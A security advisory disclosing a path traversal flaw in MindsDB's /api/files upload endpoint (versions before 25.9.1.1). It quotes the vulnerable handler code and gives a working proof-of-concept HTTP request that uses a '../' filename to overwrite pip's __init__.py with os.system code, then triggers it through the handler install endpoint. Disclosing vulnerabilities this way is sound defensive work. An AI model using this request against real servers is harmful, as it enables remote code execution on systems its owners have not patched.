# MindsDB: Path Traversal in /api/files Leading to Remote Code Execution

**GHSA**: GHSA-4894-xqv6-vrfq | **CVE**: CVE-2026-27483 | **Severity**: high (CVSS 8.8)

**CWE**: CWE-22

**Affected Packages**:
- **mindsdb** (pip): < 25.9.1.1

## Description

### Summary

There is a path traversal vulnerability in Mindsdb's /api/files interface, which an authenticated attacker can exploit to achieve remote command execution.

### Details

The vulnerability exists in the "Upload File" module, which corresponds to the API endpoint /api/files. The affected code is located at mindsdb/api/http/namespaces/file.py:
```python
@ns_conf.route("/<name>")
@ns_conf.param("name", "MindsDB's name for file")
class File(Resource):
    @ns_conf.doc("put_file")
    @api_endpoint_metrics('PUT', '/files/file')
    def put(self, name: str):
        """add new file
        params in FormData:
            - file
            - original_file_name [optional]
        """

        data = {}
        mindsdb_file_name = name

        existing_file_names = ca.file_controller.get_files_names()

        def on_field(field):
            name = field.field_name.decode()
            value = field.value.decode()
            data[name] = value

        file_object = None

        def on_file(file):
            nonlocal file_object
            data["file"] = file.file_name.decode()
            file_object = file.file_object

        temp_dir_path = tempfile.mkdtemp(prefix="mindsdb_file_")

        if request.headers["Content-Type"].startswith("multipart/form-data"):
            parser = multipart.create_form_parser(
                headers=request.headers,
                on_field=on_field,
                on_file=on_file,
                config={
                    "UPLOAD_DIR": temp_dir_path.encode(),  # bytes required
                    "UPLOAD_KEEP_FILENAME": True,
                    "UPLOAD_KEEP_EXTENSIONS": True,
                    "MAX_MEMORY_FILE_SIZE": 0,
                },
            )

            while True:
                chunk = request.stream.read(8192)
                if not chunk:
                    break
                parser.write(chunk)
            parser.finalize()
            parser.close()

            if file_object is not None:
                if not file_object.closed:
                    try:
                        file_object.flush()
                    except (AttributeError, ValueError, OSError):
                        logger.debug("Failed to flush file_object before closing.", exc_info=True)
                    file_object.close()
                file_object = None
        else:
            data = request.json
```
Since the multipart file upload does not perform security checks on the uploaded file path, an attacker can perform path traversal by using ../ sequences in the filename field. The file write operation occurs before calling clear_filename and save_file, meaning there is no filtering of filenames or file types, allowing arbitrary content to be written to any path on the server.


### PoC

This vulnerability can be exploited to overwrite existing executable files, which retain their executable permissions after being overwritten. In addition to conventional file upload exploitation methods, we provide a way to achieve Remote Code Execution (RCE) by leveraging MindsDB's own functionality.

The API endpoint /<handler_name>/install is used to install handlers, which internally calls install_dependencies to install dependencies via pip. This function executes pip using subprocess.Popen. Therefore, an attacker can:

1. Exploit the vulnerability to overwrite /venv/lib/python3.10/site-packages/pip/__init__.py with a malicious Python script.
2. Trigger the execution of the malicious script by calling /<handler_name>/install, which invokes pip.
 
Exploit：
```
PUT /api/files/mm HTTP/1.1
Host: ip:47334
Content-Length: 579
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryv9dZC0cAHLlHSHD9
Origin: http://ip:47334
Referer: http://ip:47334/fileUpload
Accept-Encoding: gzip, deflate, br
Accept-Language: zh,en;q=0.9,zh-CN;q=0.8
Cookie: bid=87948125-5042-4fc8-a692-9cbf71e387be
Connection: keep-alive

------WebKitFormBoundaryv9dZC0cAHLlHSHD9
Content-Disposition: form-data; name="name"

mm
------WebKitFormBoundaryv9dZC0cAHLlHSHD9
Content-Disposition: form-data; name="source"

mm
------WebKitFormBoundaryv9dZC0cAHLlHSHD9
Content-Disposition: form-data; name="source_type"

file
------WebKitFormBoundaryv9dZC0cAHLlHSHD9
Content-Disposition: form-data; name="file"; filename="../../../../../../venv/lib/python3.10/site-packages/pip/__init__.py"
Content-Type: text/plain

import os
os.system("touch /tmp/rce_by_hacker")
------WebKitFormBoundaryv9dZC0cAHLlHSHD9--
```
After sending this request, you can observe the logs in Docker's output:
```
2025-05-30 02:26:52,432            http INFO     python_multipart.multipart: Opening a file on disk
2025-05-30 02:26:52,433            http INFO     python_multipart.multipart: Saving with filename in: b'/root/mdb_storage/tmp/mindsdb_byom_file_89h0zcz0'
2025-05-30 02:26:52,433            http INFO     python_multipart.multipart: Opening file: b'/root/mdb_storage/tmp/mindsdb_byom_file_89h0zcz0/../../../../../../venv/lib/python3.10/site-packages/pip/__init__.py'
```
At this point, you can see that the file has been successfully overwritten:
```
root@e445c93b2fd5:/mindsdb# cat /venv/lib/python3.10/site-packages/pip/__init__.py
import os
os.system("touch /tmp/rce_by_hacker")
```
Afterwards, install any handler in the UI, and you will see that the file rce_by_hacker is successfully created in the /tmp directory. The same result can also be achieved by sending an API request to trigger it.

### Credit

This vulnerability was discovered by:
- XlabAI Team of Tencent Xuanwu Lab
- Atuin Automated Vulnerability Discovery Engine

If there are any questions regarding the vulnerability details, please feel free to reach out to MindsDB for further discussion at xlabai@tencent.com.
